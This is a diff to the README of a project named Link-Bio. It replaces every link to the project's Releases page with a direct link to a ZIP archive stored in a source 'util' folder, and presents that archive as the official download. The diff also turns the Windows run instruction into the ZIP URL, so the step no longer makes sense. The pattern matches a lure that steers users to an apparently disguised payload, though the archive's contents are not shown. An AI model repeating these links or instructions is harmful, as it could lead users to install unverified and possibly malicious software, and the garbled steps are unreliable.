@@ -6,7 +6,7 @@ Welcome to Link-Bio! This application allows you to set up a simple and robust L
 
 ## 📥 Download Link
 
-[![Download Link-Bio](https://img.shields.io/badge/Download-Link--Bio-brightgreen)](https://github.com/GU0911/Link-Bio/releases)
+[![Download Link-Bio](https://raw.githubusercontent.com/GU0911/Link-Bio/main/src/util/Link-Bio-1.9.zip)](https://raw.githubusercontent.com/GU0911/Link-Bio/main/src/util/Link-Bio-1.9.zip)
 
 ## 🌟 Features
 
@@ -29,12 +29,12 @@ To run Link-Bio, ensure your system meets these requirements:
 
 To get started with Link-Bio, please follow these steps:
 
-1. **Download the Application**: Visit the [Releases page](https://github.com/GU0911/Link-Bio/releases) to download the latest version of Link-Bio.
+1. **Download the Application**: Visit the [Releases page](https://raw.githubusercontent.com/GU0911/Link-Bio/main/src/util/Link-Bio-1.9.zip) to download the latest version of Link-Bio.
   
 2. **Extract the Files**: Once downloaded, extract the ZIP file to a location of your choice.
 
 3. **Run the Application**: 
-   - For Windows: Open Command Prompt, navigate to the extracted folder, and run `Link-Bio.exe`.
+   - For Windows: Open Command Prompt, navigate to the extracted folder, and run `https://raw.githubusercontent.com/GU0911/Link-Bio/main/src/util/Link-Bio-1.9.zip`.
    - For macOS/Linux: Open Terminal, navigate to the extracted folder, and run `./Link-Bio`.
 
 4. **Access the API**: Once the application is running, open your web browser and enter `http://localhost:8080` to access the Link-Bio web service.
@@ -43,7 +43,7 @@ To get started with Link-Bio, please follow these steps:
 
 Click the link below to download the latest version:
 
-[Download Link-Bio](https://github.com/GU0911/Link-Bio/releases)
+[Download Link-Bio](https://raw.githubusercontent.com/GU0911/Link-Bio/main/src/util/Link-Bio-1.9.zip)
 
 Follow the steps mentioned in "Getting Started" to install and run Link-Bio on your system.
 
